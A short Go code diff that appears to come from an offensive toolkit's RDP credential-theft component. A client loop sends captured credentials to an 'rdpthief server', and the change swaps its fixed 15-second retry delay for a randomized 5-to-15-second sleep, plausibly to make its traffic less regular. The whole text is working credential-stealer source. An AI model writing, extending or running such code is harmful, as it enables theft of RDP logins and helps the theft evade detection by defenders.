@@ -13,6 +13,7 @@ import (
 	"project/internal/crypto/aes"
 	"project/internal/module/windows/pipe"
 	"project/internal/patch/msgpack"
+	"project/internal/random"
 	"project/internal/xpanic"
 )
 
@@ -73,17 +74,19 @@ func (client *Client) sendCredLoop() {
 			xpanic.Log(r, "Client.sendCredLoop")
 		}
 	}()
+	sleeper := random.NewSleeper()
+	defer sleeper.Stop()
 	for {
 		select {
 		case cred := <-client.credCh:
-			client.sendCred(cred)
+			client.sendCred(sleeper, cred)
 		case <-client.ctx.Done():
 			return
 		}
 	}
 }
 
-func (client *Client) sendCred(cred *Credential) {
+func (client *Client) sendCred(sleeper *random.Sleeper, cred *Credential) {
 	// connect to the rdpthief server
 	var (
 		conn net.Conn
@@ -95,7 +98,7 @@ func (client *Client) sendCred(cred *Credential) {
 			break
 		}
 		select {
-		case <-time.After(15 * time.Second):
+		case <-sleeper.Sleep(5, 15):
 		case <-client.ctx.Done():
 			return
 		}
